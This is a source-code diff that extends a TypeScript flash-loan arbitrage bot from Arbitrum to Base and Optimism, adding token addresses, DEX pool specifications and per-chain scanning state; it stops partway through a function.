@@ -3,15 +3,28 @@ import { ethers } from 'ethers';
 import { sizeArbitrage, MAX_DEPTH_FRACTION } from './arbSizing.ts';
 import {
   ARBITRUM_TOKENS,
+  CHAIN_TOKENS,
+  getChainTokens,
   ARBITRUM_DEX_ROUTERS,
+  CHAIN_DEX_ROUTERS,
+  getChainDexRouters,
   resolveArbitrageCandidates,
   encodeExecuteDirectFlashArb,
   encodeRescueTokens,
   encodeRescueTokensTo,
   encodeErc20Transfer,
+  encodeErc721SafeTransferFrom,
+  encodeErc1155SafeTransferFrom,
+  parseExtraTokenSpec,
+  classifyDetectedErcStandard,
+  ERC165_INTERFACE_IDS,
   decodeArbitrageSwapsExecutedLogs,
   decodeFlashArbRevertError,
+  type ArbitrumTokenInfo,
+  type ErcStandard,
+  type ExtraTokenSpec,
   type RouteExecutionInput,
+  type SupportedArbChain,
 } from './flashArbExecutor.ts';
 
 export const flashArbRouter = Router();
@@ -46,9 +59,9 @@ export const BASE_RPC_POOL = [
 
 export const OPTIMISM_RPC_POOL = [
   process.env.OPTIMISM_RPC_URL,
-  'https://mainnet.optimism.io',
   'https://optimism-rpc.publicnode.com',
   'https://1rpc.io/op',
+  'https://mainnet.optimism.io',
 ].filter(Boolean) as string[];
 
 const RPC_ENDPOINTS: Record<string, {
@@ -910,11 +923,12 @@ flashArbRouter.post('/deploy-contract', async (req: Request, res: Response) => {
 });
 
 // ============================================================
-// LIVE ON-CHAIN MEV AGENT ENGINE (ARBITRUM ONE MAINNET)
+// LIVE ON-CHAIN MEV AGENT ENGINE (ARBITRUM · BASE · OPTIMISM)
 // ============================================================
 
 export interface MonitoredPoolState {
   id: string;
+  chain: SupportedArbChain;
   name: string;
   dex: string;
   pair: string;
@@ -928,6 +942,7 @@ export interface MonitoredPoolState {
 
 export interface LiveArbitrageOpportunity {
   id: string;
+  chain: SupportedArbChain;
   timestamp: number;
   blockNumber: number;
   pair: string;
@@ -958,6 +973,7 @@ export interface LiveArbitrageOpportunity {
 
 export interface ExecutedAgentTrade {
   id: string;
+  chain?: SupportedArbChain;
   txHash: string;
   timestamp: number;
   blockNumber: number;
@@ -973,8 +989,8 @@ export interface ExecutedAgentTrade {
 }
 
 // In-Memory Live Agent State with Dynamic Parameter Optimizer & Strict Profit Guard
-// ---- Monitored Arbitrum One pools (60 verified on-chain pools across 16 pairs & 6 DEXes) ----
-// Every pool address was verified on Arbitrum One via factory getPool / getPair / poolByPair.
+// ---- Monitored pools (verified on-chain across Arbitrum One, Base L2, and Optimism Mainnet) ----
+// Every pool address was verified via factory getPool / getPair / poolByPair and measured liquidity >= $5,000.
 interface Tok { sym: string; addr: string; dec: number }
 const T = {
   WETH: { sym: 'WETH', addr: '0x82aF49447D8a07e3bd95BD0d56f35241523fBab1', dec: 18 },
@@ -992,9 +1008,30 @@ const T = {
   wstETH: { sym: 'wstETH', addr: '0x5979D7b546E38E414F7E9822514be443A4800529', dec: 18 },
 } satisfies Record<string, Tok>;
 
+const BASE_T = {
+  WETH: { sym: 'WETH', addr: '0x4200000000000000000000000000000000000006', dec: 18 },
+  USDC: { sym: 'USDC', addr: '0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913', dec: 6 },
+  USDbC: { sym: 'USDbC', addr: '0xd9aAEc86B65D86f6A7B5B1b0c42FFA531710b6CA', dec: 6 },
+  cbETH: { sym: 'cbETH', addr: '0x2Ae3F1Ec7F1F5012CFEab0185bfc7aa3cf0DEc22', dec: 18 },
+  AERO: { sym: 'AERO', addr: '0x940181a94A35A4569E4529A3CDfB74e38FD98631', dec: 18 },
+  DAI: { sym: 'DAI', addr: '0x50c5725949A6F0c72E6C4a641F24049A917DB0Cb', dec: 18 },
+  cbBTC: { sym: 'cbBTC', addr: '0xcbB7C0000aB88B473b1f5aFd9ef808440eed33Bf', dec: 8 },
+} satisfies Record<string, Tok>;
+
+const OP_T = {
+  WETH: { sym: 'WETH', addr: '0x4200000000000000000000000000000000000006', dec: 18 },
+  USDC: { sym: 'USDC', addr: '0x0b2C639c533813f4Aa9D7837CAf62653d097Ff85', dec: 6 },
+  USDCe: { sym: 'USDC.e', addr: '0x7F5c764cBc14f9669B88837ca1490cCa17c31607', dec: 6 },
+  USDT: { sym: 'USDT', addr: '0x94b008aA00579c1307B0EF2c499aD98a8ce58e58', dec: 6 },
+  DAI: { sym: 'DAI', addr: '0xDA10009cBd5D07dd0CeCc66161FC93D7c9000da1', dec: 18 },
+  OP: { sym: 'OP', addr: '0x4200000000000000000000000000000000000042', dec: 18 },
+  WBTC: { sym: 'WBTC', addr: '0x68f180fcCe6836688e9084f035309E29Bf0A2095', dec: 8 },
+  wstETH: { sym: 'wstETH', addr: '0x1F32b1c2345538c0c6f582fCB022739c4A194Ebb', dec: 18 },
+} satisfies Record<string, Tok>;
+
 interface PoolSpec {
   id: string; name: string; dex: string; pair: string; address: string; fee: number;
-  kind: 'v3' | 'algebra' | 'v2'; base: Tok; quote: Tok;
+  kind: 'v3' | 'slipstream' | 'algebra' | 'v2'; base: Tok; quote: Tok;
 }
 const POOL_SPECS: PoolSpec[] = [
   // WETH / USDC (8 pools across 5 DEXes)
@@ -1098,6 +1135,117 @@ const POOL_SPECS: PoolSpec[] = [
   { id: 'camelot_v3_wsteth_weth', name: 'Camelot V3 wstETH/WETH', dex: 'Camelot V3', pair: 'wstETH/WETH', address: '0xdEb89DE4bb6ecf5BFeD581EB049308b52d9b2Da7', fee: 0.01, kind: 'algebra', base: T.wstETH, quote: T.WETH },
 ];
 
+// ---- Monitored Base L2 pools (verified on-chain via factory getPool / getPair with >= $5K depth) ----
+const BASE_POOL_SPECS: PoolSpec[] = [
+  // WETH / USDC (10 pools across 6 DEXes)
+  { id: 'base_univ3_weth_usdc_005', name: 'Uniswap V3 WETH/USDC (0.05%)', dex: 'Uniswap V3', pair: 'WETH/USDC', address: '0xd0b53D9277642d899DF5C87A3966A349A798F224', fee: 0.05, kind: 'v3', base: BASE_T.WETH, quote: BASE_T.USDC },
+  { id: 'base_univ3_weth_usdc_001', name: 'Uniswap V3 WETH/USDC (0.01%)', dex: 'Uniswap V3', pair: 'WETH/USDC', address: '0xb4CB800910B228ED3d0834cF79D697127BBB00e5', fee: 0.01, kind: 'v3', base: BASE_T.WETH, quote: BASE_T.USDC },
+  { id: 'base_univ3_weth_usdc_030', name: 'Uniswap V3 WETH/USDC (0.30%)', dex: 'Uniswap V3', pair: 'WETH/USDC', address: '0x6c561B446416E1A00E8E93E221854d6eA4171372', fee: 0.30, kind: 'v3', base: BASE_T.WETH, quote: BASE_T.USDC },
+  { id: 'base_pancake_v3_weth_usdc_001', name: 'PancakeSwap V3 WETH/USDC (0.01%)', dex: 'PancakeSwap V3', pair: 'WETH/USDC', address: '0x72AB388E2E2F6FaceF59E3C3FA2C4E29011c2D38', fee: 0.01, kind: 'v3', base: BASE_T.WETH, quote: BASE_T.USDC },
+  { id: 'base_pancake_v3_weth_usdc_005', name: 'PancakeSwap V3 WETH/USDC (0.05%)', dex: 'PancakeSwap V3', pair: 'WETH/USDC', address: '0xB775272E537cc670C65DC852908aD47015244EaF', fee: 0.05, kind: 'v3', base: BASE_T.WETH, quote: BASE_T.USDC },
+  { id: 'base_sushiv3_weth_usdc_005', name: 'SushiSwap V3 WETH/USDC (0.05%)', dex: 'SushiSwap V3', pair: 'WETH/USDC', address: '0x57713F7716e0b0F65ec116912F834E49805480d2', fee: 0.05, kind: 'v3', base: BASE_T.WETH, quote: BASE_T.USDC },
+  { id: 'base_univ2_weth_usdc', name: 'Uniswap V2 WETH/USDC (0.30%)', dex: 'Uniswap V2', pair: 'WETH/USDC', address: '0x88A43bbDF9D098eEC7bCEda4e2494615dfD9bB9C', fee: 0.30, kind: 'v2', base: BASE_T.WETH, quote: BASE_T.USDC },
+  { id: 'base_baseswap_weth_usdc', name: 'BaseSwap V2 WETH/USDC (0.30%)', dex: 'BaseSwap V2', pair: 'WETH/USDC', address: '0xab067c01C7F5734da168C699Ae9d23a4512c9FdB', fee: 0.30, kind: 'v2', base: BASE_T.WETH, quote: BASE_T.USDC },
+  { id: 'base_aero_slip_weth_usdc_ts1', name: 'Aerodrome Slipstream WETH/USDC (CL-1)', dex: 'Aerodrome Slipstream', pair: 'WETH/USDC', address: '0xdbc6998296caA1652A810dc8D3BaF4A8294330f1', fee: 0.01, kind: 'slipstream', base: BASE_T.WETH, quote: BASE_T.USDC },
+  { id: 'base_aero_slip_weth_usdc_ts100', name: 'Aerodrome Slipstream WETH/USDC (CL-100)', dex: 'Aerodrome Slipstream', pair: 'WETH/USDC', address: '0xb2cc224c1c9feE385f8ad6a55b4d94E92359DC59', fee: 0.014, kind: 'slipstream', base: BASE_T.WETH, quote: BASE_T.USDC },
+
+  // cbETH / WETH (6 pools across 4 DEXes)
+  { id: 'base_univ3_cbeth_weth_001', name: 'Uniswap V3 cbETH/WETH (0.01%)', dex: 'Uniswap V3', pair: 'cbETH/WETH', address: '0xA9DaFa443a02FBc907Cb0093276B3E6F4ef02A46', fee: 0.01, kind: 'v3', base: BASE_T.cbETH, quote: BASE_T.WETH },
+  { id: 'base_univ3_cbeth_weth_005', name: 'Uniswap V3 cbETH/WETH (0.05%)', dex: 'Uniswap V3', pair: 'cbETH/WETH', address: '0x10648BA41B8565907Cfa1496765fA4D95390aa0d', fee: 0.05, kind: 'v3', base: BASE_T.cbETH, quote: BASE_T.WETH },
+  { id: 'base_pancake_v3_cbeth_weth_001', name: 'PancakeSwap V3 cbETH/WETH (0.01%)', dex: 'PancakeSwap V3', pair: 'cbETH/WETH', address: '0x257FCbAE4Ac6B26A02E4FC5e1a11e4174B5ce395', fee: 0.01, kind: 'v3', base: BASE_T.cbETH, quote: BASE_T.WETH },
+  { id: 'base_pancake_v3_cbeth_weth_005', name: 'PancakeSwap V3 cbETH/WETH (0.05%)', dex: 'PancakeSwap V3', pair: 'cbETH/WETH', address: '0xc0efC182479319ff258EcA420e2647cD82D3790c', fee: 0.05, kind: 'v3', base: BASE_T.cbETH, quote: BASE_T.WETH },
+  { id: 'base_sushiv3_cbeth_weth_005', name: 'SushiSwap V3 cbETH/WETH (0.05%)', dex: 'SushiSwap V3', pair: 'cbETH/WETH', address: '0xb81B9Aef36c76d740850C31C45697c83468DCB54', fee: 0.05, kind: 'v3', base: BASE_T.cbETH, quote: BASE_T.WETH },
+  { id: 'base_aero_slip_cbeth_weth_ts1', name: 'Aerodrome Slipstream cbETH/WETH (CL-1)', dex: 'Aerodrome Slipstream', pair: 'cbETH/WETH', address: '0x47cA96Ea59C13F72745928887f84C9F52C3D7348', fee: 0.01, kind: 'slipstream', base: BASE_T.cbETH, quote: BASE_T.WETH },
+
+  // cbBTC / WETH (6 pools across 3 DEXes)
+  { id: 'base_univ3_cbbtc_weth_005', name: 'Uniswap V3 cbBTC/WETH (0.05%)', dex: 'Uniswap V3', pair: 'cbBTC/WETH', address: '0x7AeA2E8A3843516afa07293a10Ac8E49906dabD1', fee: 0.05, kind: 'v3', base: BASE_T.cbBTC, quote: BASE_T.WETH },
+  { id: 'base_univ3_cbbtc_weth_030', name: 'Uniswap V3 cbBTC/WETH (0.30%)', dex: 'Uniswap V3', pair: 'cbBTC/WETH', address: '0x8c7080564B5A792A33Ef2FD473fbA6364d5495e5', fee: 0.30, kind: 'v3', base: BASE_T.cbBTC, quote: BASE_T.WETH },
+  { id: 'base_pancake_v3_cbbtc_weth_001', name: 'PancakeSwap V3 cbBTC/WETH (0.01%)', dex: 'PancakeSwap V3', pair: 'cbBTC/WETH', address: '0xC211e1f853A898Bd1302385CCdE55f33a8C4B3f3', fee: 0.01, kind: 'v3', base: BASE_T.cbBTC, quote: BASE_T.WETH },
+  { id: 'base_pancake_v3_cbbtc_weth_005', name: 'PancakeSwap V3 cbBTC/WETH (0.05%)', dex: 'PancakeSwap V3', pair: 'cbBTC/WETH', address: '0xd974D59e30054cf1aBedeD0C9947B0D8Baf90029', fee: 0.05, kind: 'v3', base: BASE_T.cbBTC, quote: BASE_T.WETH },
+  { id: 'base_aero_slip_cbbtc_weth_ts1', name: 'Aerodrome Slipstream cbBTC/WETH (CL-1)', dex: 'Aerodrome Slipstream', pair: 'cbBTC/WETH', address: '0x22AEe3699b6A0fEd71490C103Bd4E5f3309891D5', fee: 0.01, kind: 'slipstream', base: BASE_T.cbBTC, quote: BASE_T.WETH },
+  { id: 'base_aero_slip_cbbtc_weth_ts100', name: 'Aerodrome Slipstream cbBTC/WETH (CL-100)', dex: 'Aerodrome Slipstream', pair: 'cbBTC/WETH', address: '0x70aCDF2Ad0bf2402C957154f944c19Ef4e1cbAE1', fee: 0.25, kind: 'slipstream', base: BASE_T.cbBTC, quote: BASE_T.WETH },
+
+  // cbBTC / USDC (5 pools across 3 DEXes)
+  { id: 'base_univ3_cbbtc_usdc_005', name: 'Uniswap V3 cbBTC/USDC (0.05%)', dex: 'Uniswap V3', pair: 'cbBTC/USDC', address: '0xfBB6Eed8e7aa03B138556eeDaF5D271A5E1e43ef', fee: 0.05, kind: 'v3', base: BASE_T.cbBTC, quote: BASE_T.USDC },
+  { id: 'base_univ3_cbbtc_usdc_030', name: 'Uniswap V3 cbBTC/USDC (0.30%)', dex: 'Uniswap V3', pair: 'cbBTC/USDC', address: '0xeC558e484cC9f2210714E345298fdc53B253c27D', fee: 0.30, kind: 'v3', base: BASE_T.cbBTC, quote: BASE_T.USDC },
+  { id: 'base_pancake_v3_cbbtc_usdc_001', name: 'PancakeSwap V3 cbBTC/USDC (0.01%)', dex: 'PancakeSwap V3', pair: 'cbBTC/USDC', address: '0xb94b22332ABf5f89877A14Cc88f2aBC48c34B3Df', fee: 0.01, kind: 'v3', base: BASE_T.cbBTC, quote: BASE_T.USDC },
+  { id: 'base_pancake_v3_cbbtc_usdc_005', name: 'PancakeSwap V3 cbBTC/USDC (0.05%)', dex: 'PancakeSwap V3', pair: 'cbBTC/USDC', address: '0x26e263efdc91f0d3279E2Ec2Bd58A7Ca5C2fCE62', fee: 0.05, kind: 'v3', base: BASE_T.cbBTC, quote: BASE_T.USDC },
+  { id: 'base_aero_slip_cbbtc_usdc_ts100', name: 'Aerodrome Slipstream cbBTC/USDC (CL-100)', dex: 'Aerodrome Slipstream', pair: 'cbBTC/USDC', address: '0x4e962BB3889Bf030368F56810A9c96B83CB3E778', fee: 0.05, kind: 'slipstream', base: BASE_T.cbBTC, quote: BASE_T.USDC },
+
+  // AERO / USDC & AERO / WETH (7 pools across 3 DEXes)
+  { id: 'base_univ3_aero_usdc_005', name: 'Uniswap V3 AERO/USDC (0.05%)', dex: 'Uniswap V3', pair: 'AERO/USDC', address: '0xE5B5f522E98B5a2baAe212d4dA66b865B781DB97', fee: 0.05, kind: 'v3', base: BASE_T.AERO, quote: BASE_T.USDC },
+  { id: 'base_univ3_aero_usdc_030', name: 'Uniswap V3 AERO/USDC (0.30%)', dex: 'Uniswap V3', pair: 'AERO/USDC', address: '0x2426DC0A657BD481ab48f86C1616431905901238', fee: 0.30, kind: 'v3', base: BASE_T.AERO, quote: BASE_T.USDC },
+  { id: 'base_aero_slip_aero_usdc_ts200', name: 'Aerodrome Slipstream AERO/USDC (CL-200)', dex: 'Aerodrome Slipstream', pair: 'AERO/USDC', address: '0xCCd9cC53b63662088c738B8BC06E9078Fb8D9ad4', fee: 0.30, kind: 'slipstream', base: BASE_T.AERO, quote: BASE_T.USDC },
+  { id: 'base_univ3_aero_weth_030', name: 'Uniswap V3 AERO/WETH (0.30%)', dex: 'Uniswap V3', pair: 'AERO/WETH', address: '0x3d5D143381916280ff91407FeBEB52f2b60f33Cf', fee: 0.30, kind: 'v3', base: BASE_T.AERO, quote: BASE_T.WETH },
+  { id: 'base_pancake_v3_aero_weth_005', name: 'PancakeSwap V3 AERO/WETH (0.05%)', dex: 'PancakeSwap V3', pair: 'AERO/WETH', address: '0x20CB8f872ae894F7c9e32e621C186e5AFCe82Fd0', fee: 0.05, kind: 'v3', base: BASE_T.AERO, quote: BASE_T.WETH },
+  { id: 'base_aero_slip_aero_weth_ts200', name: 'Aerodrome Slipstream AERO/WETH (CL-200)', dex: 'Aerodrome Slipstream', pair: 'AERO/WETH', address: '0x82321f3BEB69f503380D6B233857d5C43562e2D0', fee: 0.32, kind: 'slipstream', base: BASE_T.AERO, quote: BASE_T.WETH },
+
+  // Stable & USDbC pairs (8 pools across 4 DEXes)
+  { id: 'base_univ3_usdc_dai_005', name: 'Uniswap V3 USDC/DAI (0.05%)', dex: 'Uniswap V3', pair: 'USDC/DAI', address: '0x19a8B1542B807Cd6a76fcbb5fF5F53c6169F36d7', fee: 0.05, kind: 'v3', base: BASE_T.USDC, quote: BASE_T.DAI },
+  { id: 'base_pancake_v3_usdc_dai_001', name: 'PancakeSwap V3 USDC/DAI (0.01%)', dex: 'PancakeSwap V3', pair: 'USDC/DAI', address: '0x345825A980BD94e1480bC4f20FE4e3DAE2F23Dd3', fee: 0.01, kind: 'v3', base: BASE_T.USDC, quote: BASE_T.DAI },
+  { id: 'base_sushiv3_usdc_dai_001', name: 'SushiSwap V3 USDC/DAI (0.01%)', dex: 'SushiSwap V3', pair: 'USDC/DAI', address: '0x3BD740dc10864f35001AAB7771C56a85C48c901B', fee: 0.01, kind: 'v3', base: BASE_T.USDC, quote: BASE_T.DAI },
+  { id: 'base_univ3_usdc_usdbc_001', name: 'Uniswap V3 USDC/USDbC (0.01%)', dex: 'Uniswap V3', pair: 'USDC/USDbC', address: '0x06959273E9A65433De71F5A452D529544E07dDD0', fee: 0.01, kind: 'v3', base: BASE_T.USDC, quote: BASE_T.USDbC },
+  { id: 'base_pancake_v3_usdc_usdbc_001', name: 'PancakeSwap V3 USDC/USDbC (0.01%)', dex: 'PancakeSwap V3', pair: 'USDC/USDbC', address: '0x29Ed55B18Af0Add137952CB3E29FB77B32fCE426', fee: 0.01, kind: 'v3', base: BASE_T.USDC, quote: BASE_T.USDbC },
+  { id: 'base_sushiv3_usdc_usdbc_001', name: 'SushiSwap V3 USDC/USDbC (0.01%)', dex: 'SushiSwap V3', pair: 'USDC/USDbC', address: '0xD3f749adA01aF29a713545Fb6b8E782B49A75a20', fee: 0.01, kind: 'v3', base: BASE_T.USDC, quote: BASE_T.USDbC },
+  { id: 'base_univ3_weth_usdbc_005', name: 'Uniswap V3 WETH/USDbC (0.05%)', dex: 'Uniswap V3', pair: 'WETH/USDbC', address: '0x4C36388bE6F416A29C8d8Eee81C771cE6bE14B18', fee: 0.05, kind: 'v3', base: BASE_T.WETH, quote: BASE_T.USDbC },
+  { id: 'base_baseswap_weth_usdbc', name: 'BaseSwap V2 WETH/USDbC (0.30%)', dex: 'BaseSwap V2', pair: 'WETH/USDbC', address: '0x41d160033C222E6f3722EC97379867324567d883', fee: 0.30, kind: 'v2', base: BASE_T.WETH, quote: BASE_T.USDbC },
+];
+
+// ---- Monitored Optimism Mainnet pools (verified on-chain via factory getPool with >= $5K depth) ----
+const OP_POOL_SPECS: PoolSpec[] = [
+  // WETH / USDC (4 pools across 3 DEXes)
+  { id: 'op_univ3_weth_usdc_005', name: 'Uniswap V3 WETH/USDC (0.05%)', dex: 'Uniswap V3', pair: 'WETH/USDC', address: '0x1fb3cf6e48F1E7B10213E7b6d87D4c073C7Fdb7b', fee: 0.05, kind: 'v3', base: OP_T.WETH, quote: OP_T.USDC },
+  { id: 'op_univ3_weth_usdc_030', name: 'Uniswap V3 WETH/USDC (0.30%)', dex: 'Uniswap V3', pair: 'WETH/USDC', address: '0xc1738D90E2E26C35784A0d3E3d8A9f795074bcA4', fee: 0.30, kind: 'v3', base: OP_T.WETH, quote: OP_T.USDC },
+  { id: 'op_sushiv3_weth_usdc_005', name: 'SushiSwap V3 WETH/USDC (0.05%)', dex: 'SushiSwap V3', pair: 'WETH/USDC', address: '0x146EDa2f1D35efb5eEf5703aCeC701c68E1503d8', fee: 0.05, kind: 'v3', base: OP_T.WETH, quote: OP_T.USDC },
+  { id: 'op_velo_slip_weth_usdc_ts100', name: 'Velodrome Slipstream WETH/USDC (CL-100)', dex: 'Velodrome Slipstream', pair: 'WETH/USDC', address: '0x478946BcD4a5a22b316470F5486fAfb928C0bA25', fee: 0.035, kind: 'slipstream', base: OP_T.WETH, quote: OP_T.USDC },
+
+  // WETH / USDC.e (2 pools)
+  { id: 'op_univ3_weth_usdce_005', name: 'Uniswap V3 WETH/USDC.e (0.05%)', dex: 'Uniswap V3', pair: 'WETH/USDC.e', address: '0x85149247691df622eaF1a8Bd0CaFd40BC45154a9', fee: 0.05, kind: 'v3', base: OP_T.WETH, quote: OP_T.USDCe },
+  { id: 'op_univ3_weth_usdce_030', name: 'Uniswap V3 WETH/USDC.e (0.30%)', dex: 'Uniswap V3', pair: 'WETH/USDC.e', address: '0xB589969D38CE76D3d7AA319De7133bC9755fD840', fee: 0.30, kind: 'v3', base: OP_T.WETH, quote: OP_T.USDCe },
+
+  // WETH / USDT (4 pools across 3 DEXes)
+  { id: 'op_univ3_weth_usdt_005', name: 'Uniswap V3 WETH/USDT (0.05%)', dex: 'Uniswap V3', pair: 'WETH/USDT', address: '0xc858A329Bf053BE78D6239C4A4343B8FbD21472b', fee: 0.05, kind: 'v3', base: OP_T.WETH, quote: OP_T.USDT },
+  { id: 'op_univ3_weth_usdt_030', name: 'Uniswap V3 WETH/USDT (0.30%)', dex: 'Uniswap V3', pair: 'WETH/USDT', address: '0xdd0c6bAe8Ad5998c358b823df15A2A4181Da1b80', fee: 0.30, kind: 'v3', base: OP_T.WETH, quote: OP_T.USDT },
+  { id: 'op_sushiv3_weth_usdt_030', name: 'SushiSwap V3 WETH/USDT (0.30%)', dex: 'SushiSwap V3', pair: 'WETH/USDT', address: '0x806919878D049c8d6E1AF3B4a66FB1B05d1b2315', fee: 0.30, kind: 'v3', base: OP_T.WETH, quote: OP_T.USDT },
+
+  // WETH / DAI (2 pools)
+  { id: 'op_univ3_weth_dai_005', name: 'Uniswap V3 WETH/DAI (0.05%)', dex: 'Uniswap V3', pair: 'WETH/DAI', address: '0x95d9D28606ee55De7667f0F176eBfc3215CFD9C0', fee: 0.05, kind: 'v3', base: OP_T.WETH, quote: OP_T.DAI },
+  { id: 'op_univ3_weth_dai_030', name: 'Uniswap V3 WETH/DAI (0.30%)', dex: 'Uniswap V3', pair: 'WETH/DAI', address: '0x03aF20bDAaFfB4cC0A521796a223f7D85e2aAc31', fee: 0.30, kind: 'v3', base: OP_T.WETH, quote: OP_T.DAI },
+
+  // OP / WETH (3 pools across 2 DEXes)
+  { id: 'op_univ3_op_weth_005', name: 'Uniswap V3 OP/WETH (0.05%)', dex: 'Uniswap V3', pair: 'OP/WETH', address: '0xFC1f3296458F9b2a27a0B91dd7681C4020E09D05', fee: 0.05, kind: 'v3', base: OP_T.OP, quote: OP_T.WETH },
+  { id: 'op_univ3_op_weth_030', name: 'Uniswap V3 OP/WETH (0.30%)', dex: 'Uniswap V3', pair: 'OP/WETH', address: '0x68F5C0A2DE713a54991E01858Fd27a3832401849', fee: 0.30, kind: 'v3', base: OP_T.OP, quote: OP_T.WETH },
+  { id: 'op_velo_slip_op_weth_ts50', name: 'Velodrome Slipstream OP/WETH (CL-50)', dex: 'Velodrome Slipstream', pair: 'OP/WETH', address: '0x84a67CD00EB244edCa2288346ADD251A783243c8', fee: 0.04, kind: 'slipstream', base: OP_T.OP, quote: OP_T.WETH },
+
+  // WBTC / WETH (4 pools across 3 DEXes)
+  { id: 'op_univ3_wbtc_weth_005', name: 'Uniswap V3 WBTC/WETH (0.05%)', dex: 'Uniswap V3', pair: 'WBTC/WETH', address: '0x85C31FFA3706d1cce9d525a00f1C7D4A2911754c', fee: 0.05, kind: 'v3', base: OP_T.WBTC, quote: OP_T.WETH },
+  { id: 'op_univ3_wbtc_weth_030', name: 'Uniswap V3 WBTC/WETH (0.30%)', dex: 'Uniswap V3', pair: 'WBTC/WETH', address: '0x73B14a78a0D396C521f954532d43fd5fFe385216', fee: 0.30, kind: 'v3', base: OP_T.WBTC, quote: OP_T.WETH },
+  { id: 'op_sushiv3_wbtc_weth_030', name: 'SushiSwap V3 WBTC/WETH (0.30%)', dex: 'SushiSwap V3', pair: 'WBTC/WETH', address: '0x689A850F62B41d89B5e5C3465Cd291374B215813', fee: 0.30, kind: 'v3', base: OP_T.WBTC, quote: OP_T.WETH },
+  { id: 'op_velo_slip_wbtc_weth_ts100', name: 'Velodrome Slipstream WBTC/WETH (CL-100)', dex: 'Velodrome Slipstream', pair: 'WBTC/WETH', address: '0x319C0DD36284ac24A6b2beE73929f699b9f48c38', fee: 0.032, kind: 'slipstream', base: OP_T.WBTC, quote: OP_T.WETH },
+
+  // WBTC / USDC (2 pools)
+  { id: 'op_univ3_wbtc_usdc_005', name: 'Uniswap V3 WBTC/USDC (0.05%)', dex: 'Uniswap V3', pair: 'WBTC/USDC', address: '0x394A9fcBab8599437d9Ec4e5A4a0EB7cb1fd2F69', fee: 0.05, kind: 'v3', base: OP_T.WBTC, quote: OP_T.USDC },
+  { id: 'op_univ3_wbtc_usdc_030', name: 'Uniswap V3 WBTC/USDC (0.30%)', dex: 'Uniswap V3', pair: 'WBTC/USDC', address: '0xaDAb76dD2dcA7aE080A796F0ce86170e482AfB4a', fee: 0.30, kind: 'v3', base: OP_T.WBTC, quote: OP_T.USDC },
+
+  // wstETH / WETH (3 pools across 3 DEXes)
+  { id: 'op_univ3_wsteth_weth_001', name: 'Uniswap V3 wstETH/WETH (0.01%)', dex: 'Uniswap V3', pair: 'wstETH/WETH', address: '0x04F6C85A1B00F6D9B75f91FD23835974Cc07E65c', fee: 0.01, kind: 'v3', base: OP_T.wstETH, quote: OP_T.WETH },
+  { id: 'op_sushiv3_wsteth_weth_005', name: 'SushiSwap V3 wstETH/WETH (0.05%)', dex: 'SushiSwap V3', pair: 'wstETH/WETH', address: '0x6DbB06Aa024F4f23883a39eFc263aa490529033a', fee: 0.05, kind: 'v3', base: OP_T.wstETH, quote: OP_T.WETH },
+  { id: 'op_velo_slip_wsteth_weth_ts1', name: 'Velodrome Slipstream wstETH/WETH (CL-1)', dex: 'Velodrome Slipstream', pair: 'wstETH/WETH', address: '0xbF30Ff33CF9C6b0c48702Ff17891293b002DfeA4', fee: 0.011, kind: 'slipstream', base: OP_T.wstETH, quote: OP_T.WETH },
+
+  // USDC / USDT (3 pools across 3 DEXes)
+  { id: 'op_univ3_usdc_usdt_001', name: 'Uniswap V3 USDC/USDT (0.01%)', dex: 'Uniswap V3', pair: 'USDC/USDT', address: '0xA73C628eaf6e283E26A7b1f8001CF186aa4c0E8E', fee: 0.01, kind: 'v3', base: OP_T.USDC, quote: OP_T.USDT },
+  { id: 'op_sushiv3_usdc_usdt_001', name: 'SushiSwap V3 USDC/USDT (0.01%)', dex: 'SushiSwap V3', pair: 'USDC/USDT', address: '0x962E23cd3F58f887a5238082A75d223f71890629', fee: 0.01, kind: 'v3', base: OP_T.USDC, quote: OP_T.USDT },
+  { id: 'op_velo_slip_usdc_usdt_ts1', name: 'Velodrome Slipstream USDC/USDT (CL-1)', dex: 'Velodrome Slipstream', pair: 'USDC/USDT', address: '0x84Ce89B4f6F67E523A81A82f9f2F14D84B726F6B', fee: 0.01, kind: 'slipstream', base: OP_T.USDC, quote: OP_T.USDT },
+];
+
+const POOL_SPECS_BY_CHAIN: Record<SupportedArbChain, PoolSpec[]> = {
+  arbitrum: POOL_SPECS,
+  base: BASE_POOL_SPECS,
+  optimism: OP_POOL_SPECS,
+};
+
+const SUPPORTED_SCAN_CHAINS: SupportedArbChain[] = ['arbitrum', 'base', 'optimism'];
+
 const MULTICALL3_ADDRESS = '0xcA11bde05977b3631167028862bE2a173976CA11';
 const multicallIface = new ethers.Interface([
   'function aggregate3(tuple(address target, bool allowFailure, bytes callData)[] calls) view returns (tuple(bool success, bytes returnData)[])',
@@ -1111,6 +1259,31 @@ class LiveMevAgent {
   public pools: MonitoredPoolState[] = [];
   public opportunities: LiveArbitrageOpportunity[] = [];
   public executedTrades: ExecutedAgentTrade[] = [];
+  public poolsByChain: Record<SupportedArbChain, MonitoredPoolState[]> = {
+    arbitrum: [],
+    base: [],
+    optimism: [],
+  };
+  public opportunitiesByChain: Record<SupportedArbChain, LiveArbitrageOpportunity[]> = {
+    arbitrum: [],
+    base: [],
+    optimism: [],
+  };
+  public latestBlockByChain: Record<SupportedArbChain, number> = {
+    arbitrum: 0,
+    base: 0,
+    optimism: 0,
+  };
+  public lastErrorByChain: Record<SupportedArbChain, string | null> = {
+    arbitrum: null,
+    base: null,
+    optimism: null,
+  };
+  public lastSuccessfulScanByChain: Record<SupportedArbChain, number> = {
+    arbitrum: Date.now(),
+    base: Date.now(),
+    optimism: Date.now(),
+  };
   private loopTimer: NodeJS.Timeout | null = null;
   public isScanning: boolean = false;
   private consecutiveFailures: number = 0;
@@ -1173,6 +1346,8 @@ class LiveMevAgent {
    * while calibrating exact gas limits to consume the absolute minimum gas.
    */
   public calculateOptimalParameters(params: {
+    chain: SupportedArbChain;
+    blockNumber: number;
     pair: string;
     buyDex: string;
     buyPool: string;
@@ -1187,7 +1362,7 @@ class LiveMevAgent {
     routeType: number;
     loanToken: string;
     ethUsd: number; // real WETH/USDC price from chain
-    gasPriceGwei: number; // real eth_gasPrice from the Arbitrum RPC
+    gasPriceGwei: number; // real eth_gasPrice from the chain RPC
     lighterRoute: boolean; // both legs concentrated-liquidity pools
   }): LiveArbitrageOpportunity | null {
     const grossSpreadUsd = Math.max(0, params.sellPrice - params.buyPrice);
@@ -1255,9 +1430,10 @@ class LiveMevAgent {
     const spreadDecimals = grossSpreadUsd < 1 ? 4 : 2;
 
     return {
-      id: `opp-${cleanPair}-${cleanBuy}-${cleanSell}-${this.latestBlock}-${params.routeType}`,
